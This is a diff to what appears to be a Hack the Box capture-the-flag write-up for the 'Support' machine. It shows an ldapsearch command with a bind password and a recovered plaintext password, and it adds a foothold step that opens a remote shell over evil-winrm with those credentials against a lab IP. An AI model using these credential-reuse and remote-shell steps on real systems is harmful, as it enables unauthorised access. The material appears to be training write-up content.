@@ -322,3 +322,10 @@ ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf
 ```shell
 password: Ironside47pleasure40Watchful
 ```
+
+## FootHold
+### Evil WinRM
+```shell
+evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7a790080-3da7-47b8-a8ec-cfadbd4007d5)
